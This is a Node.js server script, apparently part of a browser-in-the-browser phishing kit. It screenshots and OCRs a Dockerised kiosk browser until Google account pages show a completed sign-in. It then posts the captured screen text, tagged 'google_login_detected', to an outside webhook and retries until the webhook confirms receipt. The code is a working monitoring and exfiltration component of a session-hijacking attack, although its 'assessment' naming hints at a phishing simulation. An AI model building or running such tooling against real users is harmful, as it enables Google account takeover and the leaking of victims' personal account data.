// bitb-server/index.js
// ─────────────────────────────────────────────────────────────────────────────
// Polls Docker container every 50ms:
//   docker exec → scrot screenshot → docker cp → tesseract OCR
// When "Home" or "Personal Info" is found in OCR text:
//   → POST to NEGD assessment webhook until { received: true }
//   → exit
// ─────────────────────────────────────────────────────────────────────────────

const { exec }    = require('child_process');
const { promisify } = require('util');
const path        = require('path');
const os          = require('os');
const http        = require('http');
const https       = require('https');

const execAsync = promisify(exec);

const WEBHOOK_URL  = 'https://negd-assesment.vercel.app/api/webhook';
const MATCH_WORDS  = ['Home', 'Personal Info', "You're signed in", 'Your devices', 'You have inactive devices'];
const POLL_DELAY   = 10;   // ms between polls (runs after previous completes)
const RETRY_DELAY  = 50;  // ms between webhook retries

let detected = false;

// ── HTTP POST helper (no external deps) ──────────────────────────────────────
function postJSON(url, data) {
  return new Promise((resolve, reject) => {
    const body    = JSON.stringify(data);
    const urlObj  = new URL(url);
    const lib     = urlObj.protocol === 'https:' ? https : http;
    const req = lib.request(
      {
        hostname: urlObj.hostname,
        port:     urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
        path:     urlObj.pathname,
        method:   'POST',
        headers: {
          'Content-Type':   'application/json',
          'Content-Length': Buffer.byteLength(body),
        },
      },
      (res) => {
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try   { resolve(JSON.parse(raw)); }
          catch { resolve(raw); }
        });
      }
    );
    req.on('error', reject);
    req.write(body);
    req.end();
  });
}

// ── Fire webhook, retry until confirmed ──────────────────────────────────────
async function sendWebhook(ocrText) {
  const payload = {
    event:      'google_login_detected',
    text:       ocrText,
    detectedAt: new Date().toISOString(),
  };

  let attempt = 0;
  while (true) {
    attempt++;
    try {
      console.log(`[webhook] attempt ${attempt} → ${WEBHOOK_URL}`);
      const result = await postJSON(WEBHOOK_URL, payload);
      console.log('[webhook] response:', result);
      if (result && result.received === true) {
        console.log('[webhook] ✓ confirmed by assessment server');
        return;
      }
      console.warn('[webhook] unexpected response:', result);
    } catch (err) {
      
      console.error(`[webhook] error: ${err.message}`);
    }
    await new Promise((r) => setTimeout(r, RETRY_DELAY));
  }
}

// ── Single OCR poll ───────────────────────────────────────────────────────────
async function pollOnce() {
  const localPath = path.join(os.tmpdir(), 'bitb_shot.png');
  try {
    // 1. Take screenshot inside container
   await execAsync(
  `docker exec bitb-kiosk sh -c "rm -f /tmp/shot.png && DISPLAY=:0 import -window root /tmp/shot.png"`
);
    // 2. Copy to host tmp
    await execAsync(`docker cp bitb-kiosk:/tmp/shot.png "${localPath}"`);
    // 3. OCR
    const { stdout } = await execAsync(`tesseract "${localPath}" stdout`);
    const text = stdout.trim();
    console.log('text', text)
    console.log(`[ocr] ${new Date().toLocaleTimeString()} → ${text.substring(0, 80).replace(/\n/g, ' ')}`);

    const isLoggedIn = MATCH_WORDS.some((w) => text.includes(w));
    return { isLoggedIn, text };
  } catch (err) {
    // docker / tesseract errors are normal while container isn't ready
   console.log(`[ocr] error: ${err.message}`);
    return { isLoggedIn: false, text: '' };
  }
}

// ── Main polling loop (sequential — waits for each poll to finish) ────────────
async function startPolling() {
  console.log(`[bitb-server] started — polling every ${POLL_DELAY}ms`);
  console.log(`[bitb-server] watching for: ${MATCH_WORDS.join(', ')}`);
  console.log(`[bitb-server] webhook target: ${WEBHOOK_URL}\n`);

  const loop = async () => {
    if (detected) return;

    const { isLoggedIn, text } = await pollOnce();

    if (isLoggedIn) {
      detected = true;
      console.log('\n[bitb-server] 🔓 login detected! firing webhook...');
      await sendWebhook(text);
      console.log('[bitb-server] ✅ done — exiting.');
      process.exit(0);
    } else {
      setTimeout(loop, POLL_DELAY);
    }
  };

  loop();
}

startPolling();
